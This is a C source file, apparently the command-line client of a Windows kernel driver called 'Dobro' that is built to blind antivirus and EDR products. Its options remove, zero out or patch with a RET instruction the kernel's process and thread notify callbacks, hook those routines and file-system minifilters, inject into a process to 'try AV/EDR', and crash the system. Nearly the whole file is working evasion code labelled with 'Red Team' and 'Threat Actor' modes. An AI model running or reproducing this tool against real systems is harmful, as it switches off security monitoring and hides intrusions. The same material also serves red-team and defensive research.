#include <Windows.h>
#include <stdio.h>
#include "..\Dobro\Common.h"
#include "Inject.h"

int Error(const char* message)
{
	printf("[ERROR] %s (error code = %d)\n", message, GetLastError());
	return -1;
}

void Usage()
{
	printf("Usage: DobroCli.exe <options>\n");
	printf("Options:\n");
	printf("  -h\t\t\t\tShow this message.\n");
	printf("  -l\t\t\t\tProcess & Thread Notify Callbacks Address's & FS Minifilters List.\n");
	printf("<Process Callbacks>\n");
	printf("  -zp\t\t\t\tZero out Process Notify Callback's Array (Cowboy Mode).\n");
	printf("  -dp <index>\t\t\tDelete Specific Process Notify Callback (Red Team Mode).\n");
	printf("  -pp <index>\t\t\tPatch Specific Process Notify Callback (Threat Actor Mode).\n");
	printf("  -rp <index>\t\t\tRollback to the original Process Notify Callback (Thoughtful Ninja Mode).\n");
	printf("<Threads Callbacks>\n");
	printf("  -zt\t\t\t\tZero out Thread Notify Callback's Array (Cowboy Mode).\n");
	printf("  -dt <index>\t\t\tDelete Specific Thread Notify Callback (Red Team Mode).\n");
	printf("  -pt <index>\t\t\tPatch Specific Thread Notify Callback (Threat Actor Mode).\n");
	printf("  -rt <index>\t\t\tRollback to the original Thread Notify Callback (Thoughtful Ninja Mode).\n");
    printf("<Hook Notify Callback>\n");
    printf("  -hps <index> <filter>\t\tHook PS notify routine.\n");
    printf("  -ups\t\t\t\tUnhook PS notify routine.\n");
    printf("  -hthr <index> <filter>\tHook THR notify routine.\n");
    printf("  -uthr\t\t\t\tUnhook THR notify routine.\n");
    printf("<FS Minifilters>\n");
    printf("  -hm <index>\t\t\tHook FS Minifilter.\n");
    printf("  -um\t\t\t\tUnhook FS Minifilter.\n");
    printf("<Check>\n");
    printf("  -chk\t\t\t\tTry AV/EDR for fun ;-) (Inject PS, need admin).\n");
    printf("<Driver Debug>\n");
    printf("  -dbg_lm\t\t\tList modules in Driver DbgPrint.\n");
    printf("  -dbg_bsod\t\t\tBS0D.\n");
}

void DisplayInfo(BYTE* buffer, ULONG size)
{
    ULONG maxCount;
    PCALLBACK_PS_FS bufPsFs;

    bufPsFs = (PCALLBACK_PS_FS)buffer;
    maxCount = size / sizeof(CALLBACK_PS_FS);
    if (maxCount == 0)
        return;

    for (ULONG i = 0; i < maxCount; i++)
    {
        if (bufPsFs->Type == TYPE_CALLBACK_PS && bufPsFs->Index == 0)
            printf("[*] Process Callbacks:\n");
        else if (bufPsFs->Type == TYPE_CALLBACK_THR && bufPsFs->Index == 0)
 			printf("[*] Thread Callbacks:\n");
        else if (bufPsFs->Type == TYPE_CALLBACK_FS && bufPsFs->Index == 0)
 			printf("[*] FS Minifilters:\n");

        if (bufPsFs->Type == TYPE_CALLBACK_PS ||
            bufPsFs->Type == TYPE_CALLBACK_THR)
        {
            printf("\t[%02llu] 0x%llx (%s + 0x%llx)\n", bufPsFs->Index, bufPsFs->NotifyAddress, bufPsFs->chModuleName, bufPsFs->ModuleBase);
        }
        else if (bufPsFs->Type == TYPE_CALLBACK_FS)
        {
            printf("\t[%02llu] %S\n", bufPsFs->Index, bufPsFs->wcModuleName);
        }

        bufPsFs++;
    }
}

int wmain(int argc, const wchar_t* argv[])
{
	if (argc < 2)
    {
		Usage();
        return -1;
	}
    
    if (wcscmp(argv[1], L"-chk") == 0)
    {
        int rc;

        printf("Enter key ($):\n");
        unsigned char k = getchar();

        rc = Inject(k);
        if (rc == -1)
            return Error("Failed inject.");

        return 0;
    }

    HANDLE hDevice;
	DWORD lpBytesReturned;
	ULONG64 OutputBuffer = 0;
	BOOL success = 0;
	DobroData InputBuffer;
	InputBuffer.list = 0;
	InputBuffer.remove = 0;
	InputBuffer.index = 65;

    hDevice = CreateFile(DEVICE_WIN32_NAME, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
        return Error("[-] Failed to open device.");

	if (wcscmp(argv[1], L"-zp") == 0)
	{
		InputBuffer.remove = 1;
		success = DeviceIoControl(hDevice, IOCTL_DOBRO_PROCESS_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
	}
	else if (wcscmp(argv[1], L"-zt") == 0)
	{
		InputBuffer.remove = 1;
		success = DeviceIoControl(hDevice, IOCTL_DOBRO_THREAD_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
	}
	else if (wcscmp(argv[1], L"-pp") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Patching index: %d with a RET (0xc3).\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_PROCESS_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}
	else if (wcscmp(argv[1], L"-pt") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Patching index: %d with a RET (0xc3).\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_THREAD_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}
	else if (wcscmp(argv[1], L"-rp") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Rolling back patched index: %d to the original values.\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_PROCESS_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}

	else if (wcscmp(argv[1], L"-rt") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Rolling back patched index: %d to the original values.\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_THREAD_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}

	else if (wcscmp(argv[1], L"-dp") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Removing index: %d\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_PROCESS_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}

	else if (wcscmp(argv[1], L"-dt") == 0 && argc == 3)
	{
		InputBuffer.index = _wtoi(argv[2]);
		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
		{
			printf("Removing index: %d\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_DOBRO_THREAD_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, NULL);
		}
		else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
	}
    else if (wcscmp(argv[1], L"-hm") == 0 && argc == 3)
    {
        InputBuffer.index = _wtoi(argv[2]);
        if (InputBuffer.index >= 0 && InputBuffer.index < 65)
        {
            printf("Hook FS minifilter: %d\n", InputBuffer.index);
            success = DeviceIoControl(hDevice, IOCTL_DOBRO_HOOK_MINIFILTER, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
        }
        else
        {
            printf("[-] Valid indexes are between 0 and 64.\n");
        }
    }
    else if (wcscmp(argv[1], L"-um") == 0)
    {
        printf("UnHook FS minifilter.\n");
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_UNHOOK_MINIFILTER, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
    }
	else if (wcscmp(argv[1], L"-l") == 0)
	{
        BYTE buffer[sizeof(CALLBACK_PS_FS) * DEF_MOD_NAME_COUNT * 3];
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_GET_LIST_ALL, NULL, 0, buffer, sizeof(buffer), &lpBytesReturned, NULL);
        DisplayInfo(buffer, lpBytesReturned);

	}
    else if (wcscmp(argv[1], L"-dbg_lm") == 0)
    {
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_DBG_LIST_MODULES, NULL, 0, &OutputBuffer, 0, &lpBytesReturned, NULL);
    }
    else if (wcscmp(argv[1], L"-dbg_bsod") == 0)
    {
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_DBG_BSOD, NULL, 0, 0, 0, 0, NULL);
    }
    else if (wcscmp(argv[1], L"-hps") == 0 && argc == 4)
    {
        InputBuffer.index = _wtoi(argv[2]);
        wcscpy_s(InputBuffer.wcModuleName, _countof(InputBuffer.wcModuleName), argv[3]);
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_HOOK_CALLBACK_PS, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
    }
    else if (wcscmp(argv[1], L"-ups") == 0)
    {
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_UNHOOK_CALLBACK_PS, NULL, 0, NULL, 0, &lpBytesReturned, NULL);
    }
    else if (wcscmp(argv[1], L"-hthr") == 0 && argc == 4)
    {
        InputBuffer.index = _wtoi(argv[2]);
        wcscpy_s(InputBuffer.wcModuleName, _countof(InputBuffer.wcModuleName), argv[3]);
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_HOOK_CALLBACK_THR, &InputBuffer, sizeof(InputBuffer), NULL, 0, &lpBytesReturned, NULL);
    }
    else if (wcscmp(argv[1], L"-uthr") == 0)
    {
        success = DeviceIoControl(hDevice, IOCTL_DOBRO_UNHOOK_CALLBACK_THR, NULL, 0, NULL, 0, &lpBytesReturned, NULL);
    }
    else
	{
		Usage();
		return -1;
	}

	if (!success)
		Error("[-] IOCTL failed!");
    else
        printf("[+] Send IOCTL success!");

	CloseHandle(hDevice);

	return 0;
}
